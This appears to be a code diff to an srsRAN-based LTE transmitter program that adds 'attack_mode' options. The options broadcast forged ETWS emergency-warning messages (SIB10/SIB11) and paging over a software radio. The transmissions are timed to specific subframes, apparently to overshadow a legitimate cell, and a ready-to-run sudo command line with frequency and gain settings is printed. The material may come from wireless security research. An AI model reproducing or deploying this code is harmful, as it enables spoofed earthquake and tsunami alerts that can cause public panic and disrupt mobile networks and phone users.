@@ -72,6 +72,7 @@ char buffer[PATH_MAX];  // 使用系统标准路径长度
  bool paging_msg = false;
  bool sib1_msg = false;
  bool sib2_msg = false;
+ bool etws_si_msg = false;
  bool po_msg = false;
  bool ar_msg = false;
  bool ir_msg = false;
@@ -92,6 +93,7 @@ char buffer[PATH_MAX];  // 使用系统标准路径长度
  static cf_t* paging_buffer[SRSRAN_MAX_PORTS] = {NULL};
  static cf_t* sib1_buffer[SRSRAN_MAX_PORTS] = {NULL};
  static cf_t* sib2_buffer[SRSRAN_MAX_PORTS] = {NULL};
+ static cf_t* etws_si_buffer[SRSRAN_MAX_PORTS] = {NULL};
  static cf_t* po_buffer[SRSRAN_MAX_PORTS] = {NULL};
  static cf_t* ar_buffer[SRSRAN_MAX_PORTS] = {NULL};
  static cf_t* ir_buffer[SRSRAN_MAX_PORTS] = {NULL};
@@ -101,6 +103,7 @@ char buffer[PATH_MAX];  // 使用系统标准路径长度
  //static char* mib_file_name;
  static char* sib1_file_name;
  static char* sib2_file_name;
+ static char* etws_si_file_name;
  static char* ext_file_name;
 
 
@@ -253,6 +256,7 @@ char buffer[PATH_MAX];  // 使用系统标准路径长度
    printf("\tsib1_systeminfovaluetag: \n\t sudo ./lib/examples/pdsch_enodeb -f 2120e6 -I UHD -x 2 -a clock=external,master_clock_rate=30.72e6,serial=3332A71 -g 70 -i output_sib1_sysinfvaltag\n");
    printf("\tsib1_tac: \n\t sudo ./lib/examples/pdsch_enodeb -f 2120e6 -I UHD -x 2 -a clock=external,master_clock_rate=30.72e6,serial=3332A71 -g 70 -i output_sib1_tac\n");
    printf("\tsib2_acbarring: \n\t sudo ./lib/examples/pdsch_enodeb -f 2120e6 -I UHD -x 2 -a clock=external,master_clock_rate=30.72e6,serial=3332A71 -g 70 -i output_sib2_acbarring\n");
+   printf("\tetws_complete: \n\t sudo ./lib/examples/pdsch_enodeb -f 2120e6 -I UHD -x 2 -a clock=external,master_clock_rate=30.72e6,serial=3332A71 -g 70 --type sib10_sib11_etws\n");
  }
  struct option cfr_opts[] = {    {"type", required_argument, 0, 't'},  // 新增 --type
  {"enable_cfr", no_argument, &cfr_args.enable, 1},
@@ -371,6 +375,24 @@ char buffer[PATH_MAX];  // 使用系统标准路径长度
                     paging_msg = true;
                     paging_file_name = "paging_sysinfmod_sf9.fc32";
                     sib2_file_name = "sib2_acbarring_sf1.fc32";
+                }
+                else if (strcmp(attack_mode, "paging_etws") == 0) {
+                    paging_msg = true;
+                    paging_file_name = "paging_etws_sf9.fc32";
+                }
+                else if (strcmp(attack_mode, "sib10_etws") == 0) {
+                    etws_si_msg = true;
+                    etws_si_file_name = "sib10_etws_sf1.fc32";
+                }
+                else if (strcmp(attack_mode, "sib11_etws") == 0) {
+                    etws_si_msg = true;
+                    etws_si_file_name = "sib11_etws_sf1.fc32";
+                }
+                else if (strcmp(attack_mode, "sib10_sib11_etws") == 0) {
+                    etws_si_msg = true;
+                    paging_msg = true;
+                    etws_si_file_name = "sib10_sib11_etws_sf1.fc32";
+                    paging_file_name = "paging_etws_sf9.fc32";
                 }
                 else if (strcmp(attack_mode, "pdcch_order") == 0) {
                     po_msg = true;
@@ -503,6 +525,13 @@ char buffer[PATH_MAX];  // 使用系统标准路径长度
        exit(-1);
      }
      srsran_vec_cf_zero(sib2_buffer[i], sf_n_samples);
+
+     etws_si_buffer[i] = srsran_vec_cf_malloc(sf_n_samples);
+     if (!etws_si_buffer[i]) {
+       perror("malloc");
+       exit(-1);
+     }
+     srsran_vec_cf_zero(etws_si_buffer[i], sf_n_samples);
 
      po_buffer[i] = srsran_vec_cf_malloc(sf_n_samples);
      if (!po_buffer[i]) {
@@ -704,6 +733,9 @@ char buffer[PATH_MAX];  // 使用系统标准路径长度
      }
      if (sib2_buffer[i]) {
        free(sib2_buffer[i]);
+     }
+     if (etws_si_buffer[i]) {
+       free(etws_si_buffer[i]);
      }
 
      if (po_buffer[i]) {
@@ -1166,7 +1198,32 @@ char buffer[PATH_MAX];  // 使用系统标准路径长度
      if (cur_rx_ret == 0 && cur_sfn >= 0) {
        next_sfn = (cur_sfn + 1) % 1024; 
        int ret = -1;
-       if (sib1_msg && paging_msg) {
+       if (etws_si_msg) {
+        target_tti = 1;
+        memcpy(&future_time, &cur_time, sizeof(srsran_timestamp_t));
+        time_offset = (10 + target_tti - cur_sf_idx) * 0.001 - 0.0001;
+        srsran_timestamp_add(&future_time, 0, time_offset - (66.0 / 30720000.0));
+        printf("%s [Subframe %d] [future_time] next_sfn: %d %.f: %f s\n", attack_mode, target_tti, next_sfn, difftime(future_time.full_secs, (time_t) 0), future_time.frac_secs);
+        ret = srsran_rf_send_timed_multi(&radio, (void**) etws_si_buffer, sf_n_samples, future_time.full_secs, future_time.frac_secs, true, start_of_burst, end_of_burst);
+        if (ret != sf_n_samples) {
+          printf("[!] Warning!!!!!!!!!: txd sample is not sf_n_samples!!!!!\n");
+          exit(-1);
+        }
+
+        if (paging_msg) {
+          target_tti = 9;
+          memcpy(&future_time, &cur_time, sizeof(srsran_timestamp_t));
+          time_offset = (10 + target_tti - cur_sf_idx) * 0.001 - 0.0001;
+          srsran_timestamp_add(&future_time, 0, time_offset - (66.0 / 30720000.0));
+          printf("%s [Subframe %d] [future_time] next_sfn: %d %.f: %f s\n", attack_mode, target_tti, next_sfn, difftime(future_time.full_secs, (time_t) 0), future_time.frac_secs);
+          ret = srsran_rf_send_timed_multi(&radio, (void**) paging_buffer, sf_n_samples, future_time.full_secs, future_time.frac_secs, true, start_of_burst, end_of_burst);
+          if (ret != sf_n_samples) {
+            printf("[!] Warning!!!!!!!!!: txd sample is not sf_n_samples!!!!!\n");
+            exit(-1);
+          }
+        }
+        target_sfn = (target_sfn + 1) % 1024;
+       } else if (sib1_msg && paging_msg) {
         if (next_sfn % sib1_period == 0 || true) {
           target_tti = 5;
           memcpy(&future_time, &cur_time, sizeof(srsran_timestamp_t));
@@ -1705,6 +1762,10 @@ int main(int argc, char** argv)
      if (sib2_msg) {
        printf ("Ready SIB2 Case!\n");
        read_file(sib2_buffer[0], sib2_file_name);
+     }
+     if (etws_si_msg) {
+       printf ("Ready ETWS SIB10/SIB11 Case!\n");
+       read_file(etws_si_buffer[0], etws_si_file_name);
      }
      if (po_msg) {
       printf ("Ready Pdcch Order Case!\n");
